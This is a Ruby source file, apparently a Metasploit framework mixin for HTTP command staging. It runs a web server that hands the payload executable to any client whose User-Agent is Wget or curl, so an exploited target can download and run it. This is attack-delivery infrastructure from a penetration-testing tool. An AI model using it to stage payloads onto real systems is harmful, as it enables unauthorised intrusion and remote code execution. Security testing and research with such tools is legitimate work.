# -*- coding: binary -*-

require 'msf/core/exploit/tcp_server'
require 'msf/core/exploit/http/server'

module Msf::Exploit::CmdStager
module Http

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Stance' => Msf::Exploit::Stance::Aggressive
    ))
  end

  def start_service(opts = {})
    if opts[:busybox] && (ssl = datastore['SSL'])
      datastore['SSL'] = false
    end

    super
    payload_uri = get_uri

    if ssl
      datastore['SSL'] = true
    end

    payload_uri
  end

  def resource_uri
    if (datastore['URIPATH'] || '').end_with?(?/)
      random_uri
    else
      super
    end
  end

  def on_request_uri(cli, request)
    if request['User-Agent'] =~ /^(?:Wget|curl)/
      send_response(cli, exe)
    else
      send_not_found(cli)
    end
  end

end
end
